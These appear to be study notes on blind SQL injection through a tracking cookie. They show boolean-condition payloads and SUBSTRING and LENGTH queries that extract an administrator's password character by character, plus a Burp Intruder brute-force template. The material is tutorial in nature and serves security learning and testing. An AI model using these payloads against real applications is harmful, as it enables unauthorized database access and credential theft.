Blind SQL injection happens when an application is vulnerable to SQL injection, but its HTTP responses do not contain results of the query or details of errors.

Techniques such as `UNION` attacks are not reliable as we cannot see any outputs from the application

__Exploiting blind SQL injection by triggering conditional responses__
- Consider an application which uses cookies to gather analytics, requests to the application include a cookies header
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```
- When a request with `TrackingId` cookies is processed the application is processed, the application uses a SQL query to determine whether this is a known user.
```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
- Even though results are not shown we get a _welcome, back!_ on success, this behaviour is enough to exploit the blind SQL injection.
- Say we submit the following two inputs as the `TrackingId`.
```
...xyz' AND '1'='1
...xyz' AND '1'='2
```
- The SQL queries resulting from these injections will be
```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '...xyz' AND '1'='1'
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '...xyz' AND '1'='2'
```
- The first query will return a _Welcome, Back!_ message as the condition `AND '1'='1'` is always true.
- The second value will not do so as the condition `AND '1'='2'` is not true.
- For example suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`.
- It is possible to determine the password for this user one character at a time, start with the following input.
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```
- This say returns _Welcome Back_ means the condition is true i.e. the first character is greater than `m`(in ASCII codes).
- Next we send
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```
- This does not return _Welcome Back_ indicating the injection is false so the character is not greater than `t` i.e. it is between `m` and `t`.
- Checking all possible chars between `m` and `t` we may find the following to be true.
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```
- This can be continued to find the full password of the `Administrator` user.
- `SUBSTRING` is replaced by `SUBSTR` in certain databases.
- It is also possible to find length of the password as follows
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```
- Then keep incrementing the `1` till the _Welcome Back_ message stops.
- Check for each character in the password as follows
```
AND (SELECT SUBSTRING(password,<char_postion>,1) FROM users WHERE username='administrator')='§char§
```
- keep incrementing the `char_position` till the password length, and use Burp intruder to brute force `char`.
```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'xyz'||(SELECT '')||''
```